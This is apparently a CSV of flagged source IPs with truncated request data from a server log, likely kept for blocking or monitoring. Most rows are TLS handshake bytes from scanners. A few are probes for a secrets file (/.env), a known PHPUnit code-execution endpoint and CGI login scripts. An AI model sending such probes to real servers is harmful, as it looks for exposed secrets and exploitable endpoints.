38.110.46.241,HIGH,1,"\x16\x03\x01\x00u\x01\x00\x00q\x03\x03\x5C\xAE+B\x16\xCF\xCE\xEB\x7F\xFA\xFBE\xCC\x0E\x9CA]\xD9u\x12"
45.156.129.156,HIGH,1,"GET /cgi-bin/authLogin.cgi HTTP/1.1"
45.156.129.158,HIGH,1,"GET /cgi-bin/main.pl HTTP/1.1"
45.91.64.7,HIGH,1,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x01\x18+\x1F\xE1K\x99\x08\xA08x\x98\x16\xAD\x87\x03=\xC"
64.226.111.158,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xC3@d;\xE4\x00\xDCt\x0C\x81\xAD\x5C\xFAk\xB5Ap\xBB\xC0\"
64.62.156.212,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xAB\x83X\xC1\xB2M\xCF\x0B\x9Ee\xC0nve\xC0\xB2\xB7\x87q\xCBg\x"
65.49.1.10,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x00\x85\xB6\x0E5\xA4ml9M\x8C\xC2_pc\x12\xCCrW4\x96\xEAo \xFE\"
65.49.1.152,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03c0\xEBE\xB1\xBE\xC6-df\x89\xB1M\xD9p\xF1\xC6\x89Ym1\xB6\x1A\xE"
65.49.1.162,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03N\xDB\xD4\xE5\xE8:\x9A\xF3\xF8\xAD\x226[4KO8\xCB\xDA\xCB\x80\x"
65.49.1.172,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03e\x81\xB8Z\xBE\xD8\xF3\xFCA0\xE4Z\x1Bh7P\xA2\xA5\xA8\xD2\xDAm"
65.49.1.222,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_\x04\xDB\x0F\xAD'\xA7k\xB5\x9E\x95J\xB8RZ\xE7`R3\x16y\xA7\xAA"
65.49.1.94,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x86!\xA4\xE4\x1D!QG\xCD\xF8\xB7\xB3\x03RW\xFA\x11\xE9\xFB\xD8"
65.49.20.69,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03;\x15gdc\xB4\x12\xE9\xFA\xD8E\xCC-\xD7?\x08\x03\xCC\xC4\x0CK\x"
66.132.153.113,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xEC[\x8F\x17ewnb\x8D\x82\x86\x05I\xA9\xB6\xF9\x154\xF5\"
74.82.47.2,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xD4E~\xF6j:,\xA5\x1B\x01:\x8D\x026p\xB3\x1E\xC6O.\xC4$#\xC1\x"
74.82.47.4,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x039\x9F\x8D\xE2\xA6\x1F\x08\x09\xD2Eyy\x18_S\xDF\xFF?A\x1F\xA4\x"
8.210.123.17,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x96\xF8?\xADgo\x16\xCB\xB0\x03\xC5h\x09t\x8CH\x93rO %\xE9\x18"
91.196.152.14,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xB73\xA63\xEF\x1DS\xC9\xBB\x13\x0Bz\x0E\xDA"
91.196.152.18,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03\xC2A\xF9\x9F\xB8\xCF\x0E?\xFF\x0B\xD1\xE1\x0F\xFD-3\x03"
91.231.89.142,HIGH,1,"\x16\x03\x03\x01\xA6\x01\x00\x01\xA2\x03\x03h\xB8\xF6a\x8B\xA1\xD9\x07fvd1\xF0l\x8C:\xC9\x9E\xDF-\xF"
91.92.240.222,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\x14@g\xE9}o\xB0*\x13P\x89\xC1\xA3\xCB\x04\xEC\xFC\xFA\x"
91.92.241.119,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFB3}j\xA4\x14s\xDDK\x89\x16\xA2\xC3\x9DZ\xA0h,\x8A\x10"
91.92.242.214,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03^\xA8\xA7#\xBBl\x1F\xC1\xCA\xD87/\xF3\xF6\x11\xC7B\xBB\x"
92.63.197.50,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03\xBCZ(O\xB0\x91N.\x83-\x0B/k\x00\x91xt\xFF\xE7\xEF\x09(\"
118.193.64.235,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\xCB\xBA\xE6\xD9\x94\xE9-|/\xD7\x83A\xEB4q\xE7\xA5\xEF\x"
118.194.228.239,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\xBD\xECn+\x8D\x18fZy;v^\x10\xBC\xAAk\x05's]\xD8\x11\xA6"
123.58.196.49,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03$\xD6\x8F\xE3\x15\xE4\xE0\xD0:\xE1)\xAC\xD4|\x1DD"
123.6.49.6,HIGH,1,"\x16\x03\x01\x016\x01\x00\x012\x03\x03\x1F\x0F\x95w\x1D+\x10\xE5,\x05\x1E2\xA8j\xFD?\x04\xC3\xEB\xF6"
146.190.63.248,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xA0\x9DW\x10/\xB3\xBF\x9A\xA3\xF4%\x13\x99nA\xC4~\x8A\x"
150.107.38.5,HIGH,1,"\x16\x03\x01\x00\xFC\x01\x00\x00\xF8\x03\x03\x8B\xC9\x82\xF3\x90\xF9\xBA3xb\x9B\xAC\xFD!\xD4\x1D\xC4"
152.32.141.176,HIGH,1,"\x16\x03\x01\x00\xF2\x01\x00\x00\xEE\x03\x03\xF9\xCCN\x07C\x14\x87m\x96L\x84\xA6I\x8FyB\x19\x99m\x5C"
159.65.152.20,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03_\xA6\xBA\x0EW6.E\x981\xF7\xDAcJ\xA4^u$\x1B\xC9B\xA1c\x16\xDAy"
162.142.125.118,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03~\xB9\x80J\x18\xCEd\xE1M\x81\xBC\x18\x8A\xA8\x84\xD0>);\"
162.142.125.192,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x98?\xF1z\xBFV\xDF\xF7v\xA1\x05\x82\xD0\xA5\x8F#!E\xF6q"
162.142.125.199,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\x81\xB7\xA1\xEE\x80c\xACCJ\x98\x09M\xB1'k\x9E\xDCu\xAA\"
162.142.125.202,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x033\x14A`\xE7\x1C\x8Bf\xF9\x0C\xE0T1\x97\x87o]\xEF\x0E49\x"
162.142.125.211,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB0\x911|5i4W\x12m\x98Y\x11"
167.71.34.54,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03<\x1F6\xE5\x8E;\xB2\xE4\xD2\x13\x84\xBD^\xFFy\xD6\xF0,\x"
167.94.138.122,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03u\xFEWk\xBF\xE4\x1D\xE9\xB0,#\xA6\xA5\xEA\xE5\xAA\xD9I\x"
167.94.138.194,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03B\x8D\xAB\x95B"
167.94.138.201,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03%)f~+\xF5<+\xD4|\xFC\xE7\x1CK\xA0\xED\x08\x0C\x5C\xD5\x0"
167.94.138.32,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xF2\x8C\xA4j\xBA\xBF\xF9f\x9DJ\x191\xE7b\x94\xA1\xDF\xE"
167.94.138.39,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE7\x1E\xF2AV\x92\x8BF\x7F\xFD\x88J\x81"
167.94.138.43,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03aT\xC9\xABx``\xD8\x08\xFF\x82g\xB2\xC9,o\x1E\x9CzM\xFAMd"
167.94.138.55,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE5\xDE\x9E\xAC\xA3\x99\x8D,\xA2\xA8\x80/|\x01_@6\xCF\x"
167.94.146.53,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xA0\xE0\x90<9\x9D\xF0j\xBC\x0B\x8CN\x1CL\x1C\x1C\xD6S\x"
172.104.11.4,HIGH,1,"\x16\x03\x01\x01"
172.105.128.11,HIGH,1,"\x16\x03\x01\x01"
172.236.228.218,HIGH,1,"\x16\x03\x01\x01"
172.236.228.227,HIGH,1,"\x16\x03\x01\x01"
172.236.228.245,HIGH,1,"\x16\x03\x01\x01"
172.236.228.38,HIGH,1,"\x16\x03\x01\x01"
172.239.103.228,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03R\xC7\x95\x08\xE5\xB0j\xB653\xD9\x93\xC3\xABQ\x90\xB1\x0"
172.239.109.149,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03S.\x85\xEB^\x0F\xD7k3}\xE7\xA4't\x83\xEA9\xC1n\x87\xC1_a"
173.239.240.70,HIGH,1,"POST /.env HTTP/1.1"
173.239.240.75,HIGH,1,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
173.239.240.83,HIGH,1,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
181.215.65.83,HIGH,1,"POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1"
185.209.198.206,HIGH,1,"\x16\x03\x00\x00i\x01\x00\x00e\x03\x03U\x1C\xA7\xE4random1random2random3random4\x00\x00\x0C\x00/\x00"
185.242.226.40,HIGH,1,"\x16\x03\x01\x01\x00\x01\x00\x00\xFC\x03\x03\x16\xC9n5\xB7W\x89Zc\xA5%\x16V"
185.242.246.115,HIGH,1,"\x16\x03\x01\x00\xE8\x01\x00\x00\xE4\x03\x03\xE4\xF1q\xE3\x1E\x94F\x22\xA6\x81\x8B\xB1\xC8\xD1\xFA\x"
192.155.90.220,HIGH,1,"\x16\x03\x01\x01"
194.164.107.4,HIGH,1,"\x16\x03\x01\x00\xEC\x01\x00\x00\xE8\x03\x03\xC6\xAA>\xC0\x86\xEE\xCCB\xD2J\x93(H\x19h\xBB\xFBC\x03"
195.184.76.172,HIGH,1,"\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03\x9Fu\xFB 8\xC2`\xD9s\xBF\xA3\xF0\xD2\xD7\xFD\xD8\xAC\xF"
206.168.34.112,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xD5\xB9~\x13\xB2\x86\xCC*\x1E=[\xEF\x1A!\xEF\xB2L\xF5\x"
206.168.34.199,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03':q\x8E"
206.168.34.207,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB8\xAC\x8F\x12p&#\x10r\x82\x0B@\xD0\xD7\x0C\xAD\xB6E2\"
206.168.34.32,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xE2\xEE[\xFCn\x87g\x90\xFE7+v\xD0\xF0\x88\xB98`\xADB\x0"
206.168.34.37,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xFD\xF9J[\x9A\xE8\xA6?~f\x9Dp\xAE\x155\x9AYy\xA0\xEBr\x"
206.168.34.59,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03g\xFF=\x81\x11\xA5\xE4\xDA\xD6oG\x9ED{\x1B\x09Va\x9B\x9B"
209.97.137.68,HIGH,1,"\x16\x03\x01\x00\xEA\x01\x00\x00\xE6\x03\x03\x8E\x1B\xC1\xD2\x8D\x05?Q\xFE\x1FM\x06\xDB\xE8\x8D\xF4g"
210.92.106.113,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03'\xE8\xEFQ\xE0\xBE\xB7\x9A\xE9\xEBh~\x93\xF0\x90\x90\xF8"
216.180.246.104,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xB23"
216.180.246.190,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03j\x84\x84\xEEu8:\xDF\xAE\xA3(\xC9t\xC9\x1FN\xD3\xD1\xD4\"
216.180.246.53,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03\xEBxO\xE9\x01\xA3\xDAh\x90\x9B?\xD1\xFBtq\x06\x89\xD3\x"
3.148.178.131,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03 \x8A;\xA8\x81\x12\x1C4Y:\xE0A\xB8]\x93\xF5\x1FA\x8F\x8B\x5Co0"
3.18.105.83,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03l\xEC\x0EG\x8A_\x04\xF5\xB7\x06Pkg\x1Br\x88\xD1\xA07\xBA\x00\x"
45.79.128.205,HIGH,1,"\x16\x03\x01\x01"
45.79.181.94,HIGH,1,"\x16\x03\x01\x01"
46.161.50.108,HIGH,1,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\x95m\xF5Hf\xE8\x9E\xA0V\xAB'R\xC6\x9C\x09\xE9/;\x90\x87"
5.101.64.6,HIGH,1,"\x16\x03\x02\x01o\x01\x00\x01k\x03\x02RH\xC5\x1A#\xF7:N\xDF\xE2\xB4\x82/\xFF\x09T\x9F\xA7\xC4y\xB0h\"
5.181.86.46,HIGH,1,"\x16\x03\x03\x00\x8E\x01\x00\x00\x8A\x03\x03iy_j\x1D\x0Bp\x89p]\x8D\xBC\x960\xAFWh<\xD6\xBBD\x9A\xCA"
64.62.156.132,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB6\xA6f\xD9(&\xB5\xE0\xCF\x17\x17\xD5bM\xA5-b\xACT\x84Z \x03"
64.62.156.152,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x033\xEA}\xB9\x9A\xEAR\xED\xB6`\xE7\xA1\x86\x97\x83\xBE"
64.62.156.162,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x039\xB8\xBF\xD3\xC7\xD7#5\x1AV.NA\x04\xB4\xAC\xEC\x8B\x00\xC0\x9"
64.62.197.227,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x19\xD0M\x80\xF7!w\xF3M\x09\xA6\x0B\xA8$\xD0\xA3\xB4\x9D\x19\"
64.62.197.47,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x1F\xC9\x87\x91\xE2z\xF9\x05B7%\xF8%\x13\xC0\xA7\x90\x98\x07A"
64.62.197.92,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xDD\xCB\x1DB\xE5\xEB,\x0C\xD7K\xD6R\xB8\xF7tt\xDE\x01n/\x88i\"
65.49.1.182,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xFF\x9C\x82R\xBD\xAC\x1C\xED.Y\xF8\xD0L\x946o\x89(\x8E\xDD#\x"
91.196.152.23,HIGH,1,"\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03-\x88\xFF$;\x8F\xF5\xEE\xA6\x22.$\x13\xC1\x0B\xA8\xA2\x0"
91.230.168.14,HIGH,1,"\x16\x03\x03\x01\xA4\x01\x00\x01\xA0\x03\x03\xD9B\x1F\xB1\x0EI~\xE8\x91\x00+\xE2|\xE8\xDF\xB7"
91.92.241.152,HIGH,1,"\x16\x03\x01\x05\xC6\x01\x00\x05\xC2\x03\x03\xE4\x8B\xD9\xD00[\x89I#7nQ9h\xE2q|\x17\xC4'\xA8|\xC8\xE"
93.123.109.124,HIGH,1,"\x16\x03\x01\x00\x9A\x01\x00\x00\x96\x03\x03\xBDu\xB5\x22R\x1Bk\x19\x05\x07G\xE5\xA5\x9C\x8Fn\x07NM\"
162.142.125.115,HIGH,1,"\x16\x03\x01\x00\xFF\x01\x00\x00\xFB\x03\x03Zb\xC7#\x22-\xDC\xE9\x9B\xD8\xDB\xA0\x8A+\xE2t\x09R\xFD\"
165.232.126.88,HIGH,1,"\x16\x03\x01\x01\x0C\x01\x00\x01\x08\x03\x03\xAA\x8A\xE2\x8CJc\x86\x18\xA4AP\xE0\x15\xAA\x96l\x0Fo\x"
167.94.138.185,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03G\x01\x98\xEDz\xB8\xCF\x11A\xB4\x0C<\x97\xB3\x1A=\x89\x1"
172.236.228.115,HIGH,1,"\x16\x03\x01\x01"
178.22.24.64,HIGH,1,"\x16\x03\x01\x02\x00\x01\x00\x01\xFC\x03\x03;q\x1C\x5C\x14\x9E\x09Ja\xFDn\xCD\xA0\x84d\xCB=\x18\xC7\"
206.168.34.126,HIGH,1,"\x16\x03\x01\x00\xFF\x01\x00\x00\xFB\x03\x03\x8B\x15\x04\xC8\xCFB\xA2\x9BqUp\xAE\x91r[S*\xAA\xAEE\xC"
206.168.34.192,HIGH,1,"\x16\x03\x01\x00\xEE\x01\x00\x00\xEA\x03\x03_\x9B\x14\x19t*d:\xB0\x03\xE0\xD1\x03\xC4'/$\xED\x02\xAF"
216.218.206.68,HIGH,1,"\x16\x03\x01\x00\x99\x01\x00\x00\x95\x03\x03\xAEN\x17\xE6\xC4MI5\x9E!h\xE1\xF2MAI\xD2R}("
45.79.181.104,HIGH,1,"\x16\x03\x01\x01"
64.62.156.172,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xE7K\x954\x8Cf\xCD\xD1\xBE\xFDM(\xBA\xCB\x02\x8A\x8C+5\x06u\x"
64.62.156.38,HIGH,1,"\x16\x03\x01\x00\x99\x01\x00\x00\x95\x03\x03\xE0\x8Fn\xC7\xADc\x82J\x9B\xA8\xD3\xD9\xB0"
64.62.156.52,HIGH,1,"\x16\x03\x01\x00{\x01\x00\x00w\x03\x03>\x1B\xC2d>[\xF6\x88a*\x1CR\xD93Zc\x22"
79.124.40.174,HIGH,1,"\x16\x03\x01\x05\xA8\x01\x00\x05\xA4\x03\x03\xCB\xD5]\xA9C9\xD7\xCA\xF6_`\x08jR\xBD\x9D\x15\x04\xD7\"
